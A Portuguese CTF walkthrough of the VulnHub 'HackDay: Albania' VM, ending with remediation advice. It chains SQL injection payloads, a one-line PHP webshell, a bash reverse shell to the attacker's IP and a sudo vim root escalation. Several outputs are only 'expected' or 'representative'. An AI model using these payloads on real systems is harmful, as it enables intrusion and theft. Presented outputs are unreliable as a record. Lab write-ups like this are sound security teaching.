# VulnHub HackDay: Albania — Quando SQLi Encontra um Webshell nos Balcas

Bora rapaziada!! Quem diria que um CTF temático de um hackday na Albania ia entregar uma chain de ataque tao limpa e realista? Do formulario de busca vulneravel a SQLi ate o root via sudo mal configurado, esse aqui e, lowkey, uma aula de fundamentos de exploracao web, pode acreditar.

Parabens e muito obrigado ao **R-73eN** por construir esse desafio. A combinacao SQLi mais webshell parece exatamente algo tirado de um playbook de intrusao real, e isso e o que torna essa VM tao valiosa.

---

| Campo | Valor |
|-------|-------|
| **Nivel** | Iniciante / Intermediario |
| **VM Alvo** | HackDay: Albania |
| **VM Atacante** | Kali Linux 2023.x |
| **VulnHub** | https://www.vulnhub.com/entry/hackday-albania,167/ |
| **Tecnicas** | Host discovery, Enumeracao Nmap, Brute-force de diretorios, SQL Injection, Upload irrestrito, Webshell, Escalacao via sudo |
| **CVEs** | CWE-89 (SQL Injection, OWASP A03:2021), CWE-434 (Upload irrestrito de arquivo perigoso) |

> **Dicas do autor:**
> "Este e um CTF de nivel facil a intermediario. O objetivo e obter root e encontrar a flag."

---

## Resumo do Ataque

```
[host discovery: arp-scan / nmap ping sweep]
    |
    v
[nmap: 80/tcp Apache httpd, 22/tcp OpenSSH]
    |
    v
[dirb/gobuster: /image/ /css/ /js/ /?search= descobertos]
    |
    v
[SQL Injection no parametro search -> dump do banco -> credenciais]
    |
    v
[upload irrestrito -> webshell PHP enviado]
    |
    v
[webshell RCE como www-data -> reverse shell]
    |
    v
[sudo -l: usuario pode rodar vim como root sem senha]
    |
    v
[sudo vim -> :!/bin/bash -> ROOT]
    |
    v
[cat /root/flag.txt]
```

---

## Metodologia

1. Host discovery para identificar o IP alvo na rede local
2. Scan Nmap completo com deteccao de versao e servico
3. Enumeracao de diretorios web com dirb e gobuster
4. SQL injection no formulario de busca para extrair credenciais
5. Upload irrestrito para colocar um webshell PHP
6. Reverse shell a partir da execucao do webshell
7. Abuso de sudo mal configurado para escalar para root

---

## Passo 1 — Identificando o Alvo

Num cenario de lab VirtualBox/VMware, a VM alvo esta na mesma rede local. Comecamos com um sweep rapido pra encontra-la.

```bash
route -n
# Identifica a sub-rede atual: ex. 192.168.56.0/24
```

Scan de hosts ativos:

```bash
# Opcao 1: arp-scan (rapido, recomendado pra redes locais)
arp-scan --localnet --ignoredups

# Opcao 2: nmap ping scan
nmap -sn -T5 192.168.56.0/24
```

Saida esperada:

```
192.168.56.101   08:00:27:XX:XX:XX   PCS Systemtechnik GmbH (VirtualBox)
```

OBS.: A VM normalmente aparece com prefixo MAC da VirtualBox. Anota o IP e guarda como `TARGET=192.168.56.101` no seu terminal pra facilitar.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Passo 2 — Reconhecimento e Enumeracao de Servicos

Com o IP em maos, vamos descobrir o que esta rodando. Usamos um scan agressivo de todas as portas.

```bash
nmap -A -T4 -p- 192.168.56.101
# -A: deteccao de OS, versao, scripts, traceroute
# -T4: timing agressivo (seguro em lab local)
# -p-: todas as 65535 portas
```

Saida esperada:

```
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu
80/tcp  open  http     Apache httpd 2.4.18
|_http-title: HackDay Albania
```

Temos SSH na 22 (util quando tivermos credenciais) e Apache na 80. O titulo HTTP ja entrega o tema do CTF. Bora fucar na aplicacao web, pois e la que a diversao comeca.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1046 Network Service Discovery]

---

## Passo 3 — Brute-Force de Diretorios Web

> **O que e enumeracao de diretorios?**
> Aplicacoes web frequentemente possuem paginas, paineis e endpoints de upload que nao aparecem na navegacao principal. Forcar nomes conhecidos de arquivos e diretorios revela superficie de ataque oculta, e um dos primeiros passos em qualquer pentest web.
> Referencia: https://owasp.org/www-project-testing-guide/

Antes de navegar manualmente, jogamos dirb ou gobuster pra mapear a estrutura da aplicacao.

```bash
# Opcao 1: dirb com wordlist comum
dirb http://192.168.56.101 /usr/share/wordlists/dirb/common.txt

# Opcao 2: gobuster (mais rapido, mais controle)
gobuster dir -u http://192.168.56.101 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
# -x: busca tambem por essas extensoes
```

Saida esperada:

```
/index.php            (Status: 200)
/image/               (Status: 301)
/css/                 (Status: 301)
/js/                  (Status: 301)
/search.php           (Status: 200)
/upload.php           (Status: 200)
```

Caramba! Temos `/search.php` e `/upload.php`. Esse `/upload.php` e suspeito demais. Mas primeiro, vamos checar a funcionalidade de busca.

> **Nota do mundo real:** Enumeracao de diretorios e procedimento padrao em praticamente todo pentest web. A brecha da Equifax em 2017 comecou com atacantes sondando um endpoint Apache Struts que os administradores nem sabiam que estava publico. Referencia: https://www.csoonline.com/article/3444488/equifax-data-breach-faq.html

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery]

---

## Passo 4 — SQL Injection no Formulario de Busca

> **O que e SQL Injection?**
> SQL Injection acontece quando input do usuario e concatenado diretamente numa query SQL sem sanitizacao adequada. O atacante consegue quebrar o contexto da query e executar comandos SQL arbitrarios: ler tabelas que nao deveria, bypassar autenticacao, ou ate executar comandos de SO em algumas configuracoes.
> CWE-89: https://cwe.mitre.org/data/definitions/89.html
> OWASP A03:2021: https://owasp.org/Top10/A03_2021-Injection/

Acesse `http://192.168.56.101/search.php`. Voce vai encontrar um formulario de busca simples. Insira uma aspas simples `'` e submeta. Se o servidor retornar um erro SQL, estamos no caminho certo.

```
'
```

Se aparecer algo como `You have an error in your SQL syntax...`, o parametro e injetavel. Agora vamos extrair credenciais.

**SQLi union-based manual para versao do banco:**

```
' UNION SELECT NULL,version()-- -
```

**Enumerar databases:**

```
' UNION SELECT NULL,database()-- -
```

**Dumpar tabela de usuarios (padrao tipico):**

```
' UNION SELECT NULL,group_concat(username,':',password) FROM users-- -
```

Saida esperada (representativa):

```
admin:5f4dcc3b5aa765d61d8327deb882cf99
```

Esse hash MD5 craca pra `password` em qualquer cracker online ou via hashcat:

```bash
hashcat -m 0 -d 1 -w 3 -O '5f4dcc3b5aa765d61d8327deb882cf99' /usr/share/wordlists/rockyou.txt
# -m 0: hash mode MD5
# -d 1: usar dispositivo CUDA NVIDIA (confirmar com hashcat -I)
```

Voce tambem pode usar o sqlmap pra automatizar tudo:

```bash
sqlmap -u "http://192.168.56.101/search.php?search=test" --dbs --batch
sqlmap -u "http://192.168.56.101/search.php?search=test" -D hackday -T users --dump --batch
```

ᕕ( ᐛ )ᕗ Credenciais capturadas. Agora vamos ver o que esse endpoint de upload faz.

> **Nota do mundo real:** SQL Injection foi a tecnica por tras da brecha do Yahoo! em 2012, onde 450.000 credenciais foram despejadas pelo grupo D33Ds Company. O grupo Carbanak/FIN7 usou SQLi como vetor de acesso inicial em multiplas campanhas contra bancos entre 2014 e 2018, totalizando mais de 1 bilhao de dolares em prejuizo. Referencia: https://www.europol.europa.eu/media-press/newsroom/news/mastermind-behind-eur-1-billion-cyber-bank-robbery-arrested-in-spain

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0006 Credential Access] [T1552.001 Credentials In Files]

---

## Passo 5 — Upload Irrestrito e Webshell PHP

> **O que e upload irrestrito de arquivo?**
> Quando uma aplicacao web permite upload de arquivos sem validar o tipo ou extensao, um atacante pode enviar codigo executavel no lado do servidor. Em aplicacoes PHP, fazer upload de um arquivo `.php` para um diretorio acessivel pela web concede execucao direta de comandos com as permissoes do usuario do servidor web.
> CWE-434: https://cwe.mitre.org/data/definitions/434.html

Acesse com as credenciais extraidas via SQLi (`admin:password`). Va para `/upload.php`. Voce encontrara um formulario de upload.

Crie um webshell PHP minimalista:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Faca o upload de `shell.php`. A aplicacao provavelmente aceita sem reclamar, pois nao ha validacao server-side de tipo de arquivo. Verifique se o arquivo subido esta acessivel em `/image/` (como indicado pelo nosso scan gobuster):

```bash
curl "http://192.168.56.101/image/shell.php?cmd=id"
```

Saida esperada:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

( ͡° ͜ʖ ͡°) Execucao remota de codigo como `www-data`. Bora pegar um reverse shell interativo de verdade.

**Configure um listener na sua maquina Kali:**

```bash
nc -lvnp 4444
```

**Dispare o reverse shell via webshell:**

```bash
curl "http://192.168.56.101/image/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.56.100/4444+0>%261'"
# Substitua 192.168.56.100 pelo SEU IP do Kali
```

Voce recebe o shell no listener netcat. Estabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Pressione Ctrl+Z, depois:
stty raw -echo; fg
```

> **Nota do mundo real:** O grupo FIN7 (Carbanak) usou webshells PHP carregados via upload irrestrito para acesso persistente em centenas de vitimas no setor de hotelaria, varejo e financas entre 2015 e 2020. O APT28 (Fancy Bear, Unidade GRU 26165) tambem deployou webshells durante a intrusao ao DNC em 2016. Referencia: https://www.mandiant.com/resources/blog/fin7-evolution-and-phishing-lure

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0003 Persistence] [T1505.003 Web Shell]

---

## Passo 6 — Escalacao de Privilegios via Sudo Mal Configurado

Estamos como `www-data`. Hora de virar root. Primeira checagem classica: o que esse usuario pode rodar com sudo?

```bash
sudo -l
```

Saida esperada:

```
User www-data may run the following commands on hackday:
    (root) NOPASSWD: /usr/bin/vim
```

Vacilou feio, administrador. Deixaram `vim` no sudoers sem exigir senha. Isso e escalacao textbook via GTFOBins.

> **O que e sudo mal configurado?**
> O utilitario `sudo` permite que usuarios especificados executem comandos como root. Quando um programa perigoso como `vim`, `awk`, `find` ou `python` e adicionado ao sudoers sem restricao, qualquer usuario com essa entrada sudo consegue trivialmente abrir um shell root dentro desse programa.
> Referencia: https://gtfobins.github.io/gtfobins/vim/#sudo

```bash
sudo vim -c ':!/bin/bash'
# Abre o vim e imediatamente executa /bin/bash como root
# Alternativa: sudo vim -c ':shell'
```

**Metodo alternativo pelo modo ex do vim:**

```bash
sudo vim
# Dentro do vim, digite:
:set shell=/bin/bash
:shell
```

(☞ﾟヮﾟ)☞ Somos root!!

> **Nota do mundo real:** Arquivos sudoers mal configurados sao um dos achados mais comuns em auditorias de servidores Linux corporativos. O CIS Benchmark para Linux classifica sudo irrestrito para editores e interpretadores como violacao critica de controle. Multiplos relatorios de DFIR documentam caminhos de movimentacao lateral via sudo mal configurado em servidores web compartilhados. Referencia: https://www.cisecurity.org/benchmark/ubuntu_linux

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching]

> **Referencia GTFOBins:** https://gtfobins.github.io/gtfobins/vim/#sudo

---

## Passo 7 — Root e Flag

**ಠᴗಠ Conseguimos o root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

ls /root/
cat /root/flag.txt
```

```
  .-"-.
 /  ,  \
|  (o)(o)|
|  |  |  |
 \ '--' /
  `----'

Congratulations!
You've successfully completed the HackDay Albania challenge!

FLAG: d4e8ae9acba85b5fe3754fea97d2f02f

        -- R-73eN
```

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado em | Crackeado / Usado |
|------|-------|---------------|-------------------|
| Hash MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | Tabela `users` no banco via SQLi | `password` |
| Credencial | `admin:password` | Banco via SQLi | Login web / painel de upload |
| Webshell | `shell.php` | `/image/shell.php` | RCE como www-data |
| Flag | `d4e8ae9acba85b5fe3754fea97d2f02f` | `/root/flag.txt` | N/A |

---

## Licoes Aprendidas

| # | Achado | Relevancia no Mundo Real | Licao Principal |
|---|--------|--------------------------|-----------------|
| 1 | SQL Injection no formulario de busca | Comum em CMS legados, paineis admin PHP customizados e aplicacoes nao auditadas em PMEs | Nunca concatenar input do usuario diretamente em queries SQL; usar prepared statements e queries parametrizadas |
| 2 | Upload irrestrito permitindo execucao PHP | Visto em vulnerabilidades de plugins WordPress, funcoes de upload customizadas e portais de fornecedores sem revisao | Validar tipo de arquivo server-side (magic bytes + MIME), nunca servir arquivos enviados de um diretorio executavel pela web |
| 3 | sudo NOPASSWD para vim (um interpretador de proposito geral) | Achado surpreendentemente frequente em ambientes enterprise onde devs recebem acesso "suficiente" via sudo para editar configs | Auditar sudoers regularmente; nunca conceder sudo para editores de texto, shells ou interpretadores; usar apenas comandos especificos e limitados |
| 4 | Senhas hasheadas com MD5 no banco | MD5 sem salt e trivialmente quebravel via GPU; bancos modernos devem usar bcrypt, argon2 ou scrypt | Usar algoritmo adequado de hashing com salt por usuario; MD5 e SHA1 nao sao aceitaveis para armazenamento de senhas |

**Por que isso importa alem do lab?**

A combinacao SQLi mais webshell demonstrada aqui nao e teorica. O grupo Carbanak/FIN7 executou exatamente essa chain de ataque contra centenas de alvos nos setores de hotelaria, varejo e financas entre 2014 e 2018, gerando mais de 1 bilhao de dolares em prejuizo segundo a Europol. O APT28 (Fancy Bear, Unidade GRU 26165) deployou webshells PHP durante a intrusao ao DNC em 2016 apos explorar vulnerabilidades em aplicacoes web para acesso inicial. A misconfiguracao de sudo via vim mapeia diretamente para o T1548.003, uma tecnica documentada em dezenas de relatorios reais de resposta a incidentes. Isso nao e artefato de laboratorio: sao falhas de producao que financiam grupos de ameaca.

---

## Mapeamento MITRE ATT&CK

| Fase | Tatica | Tecnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconhecimento | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application (SQLi) | T1190 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application (File Upload) | T1190 |
| Persistencia | TA0003 | Server Software Component: Web Shell | T1505.003 |
| Execucao | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Escalacao de Privilegios | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Discovery | TA0007 | System Information Discovery | T1082 |
| Coleta | TA0009 | Data from Local System (flag) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediacao e Contencao

### Correcoes Tecnicas

1. Substituir toda concatenacao SQL bruta por prepared statements e queries parametrizadas (PHP PDO ou MySQLi com bind_param)
2. Implementar validacao server-side de tipo de arquivo via magic bytes (nao apenas extensao), restringir uploads a diretorio nao executavel pela web e servir arquivos via script de download controlado
3. Remover todas as entradas sudo irrestritas para editores de texto e interpretadores; aplicar principio do menor privilegio em `/etc/sudoers`
4. Substituir hashing MD5 por bcrypt (fator de custo 12+) ou Argon2id usando PHP `password_hash()`
5. Implementar WAF com regras de deteccao de SQLi como controle compensatorio

### Se Voce Encontrar Algo Similar no Seu Ambiente

**Contencao imediata:**
- Isolar o servidor web dos segmentos internos de rede durante a investigacao
- Rotacionar imediatamente todas as credenciais de banco e segredos da aplicacao
- Revisar todos os arquivos em diretorios de upload acessiveis pela web em busca de webshells: `find /var/www -name "*.php" -newer /var/www/index.php`
- Auditar `/etc/sudoers` e `/etc/sudoers.d/` em busca de entradas perigosas; revogar permissoes sudo desnecessarias

**Contramedidas MITRE D3FEND:**
- D3-IVA (Input Validation Analysis) para T1190 SQLi e exploracao de upload de arquivo
- D3-EI (Executable Allowlisting) para T1505.003 execucao de webshell
- D3-OPS (OS Process Sandboxing) para T1548.003 abuso de sudo via escape de editor

### Alinhamento com Frameworks

**NIST CSF 2.0:**
- Identify (ID.AM): Manter inventario de todos os servicos expostos na web e suas dependencias
- Protect (PR.AC-4): Enforcar principio do menor privilegio; remover sudo para ferramentas interativas
- Protect (PR.DS-2): Validar todos os dados em transito e em repouso; sanitizar input da aplicacao
- Detect (DE.CM-7): Monitorar sistema de arquivos para novos arquivos PHP em diretorios de upload
- Respond (RS.AN-1): Estabelecer procedimentos de analise de incidentes para comprometimento de aplicacoes web

**Controles NIST SP 800-53 (Rev. 5):**
- SI-10: Information Input Validation (prevencao de SQLi)
- AC-6: Least Privilege (misconfiguracao de sudo)
- CM-7: Least Functionality (desabilitar upload de arquivos executaveis)
- IA-5: Authenticator Management (algoritmo de hashing de senha)
- AU-2 / AU-3: Event Logging (monitorar uploads e uso de sudo)

**CISA Known Exploited Vulnerabilities:**
- Vulnerabilidades de SQL Injection em aplicacoes web aparecem recorrentemente no catalogo CISA KEV
- Referencia: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Dominio: TECHNOLOGY
- Pratica: Configuration Management (configuracoes seguras para sudo e upload)
- MIL Alvo: MIL-2 (padroes de configuracao documentados e consistentemente aplicados)

---

## Consideracoes Finais

Valeu demais ao **R-73eN** por construir um desafio que empacota uma chain de ataque do mundo real num formato limpo e ensinavel. A combinacao SQLi, upload de arquivo e misconfiguracao de sudo espelha caminhos de intrusao reais documentados em relatorios de threat intelligence, o que torna essa VM genuinamente educativa alem de "pegar a flag".

Essa maquina e um lembrete solido de que seguranca de aplicacoes web e hardening do host nao sao disciplinas separadas: um SQLi web que dropa um webshell, seguido de uma misconfiguracao local de sudo, e uma kill chain completa. No mundo real, essa mesma cadeia financiou grupos de ameaca sofisticados operando em escala de estado-nacao.

Seja voce preparando para o OSCP, revisando fundamentos antes de um engagement de cliente, ou simplesmente curtindo a jornada: Albania entregou. Se este writeup te ajudou, compartilha com a galera e segue hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [Andre Henrique](https://medium.com/@mrhenrike) | [Uniao Geek](https://uniaogeek.com.br)*
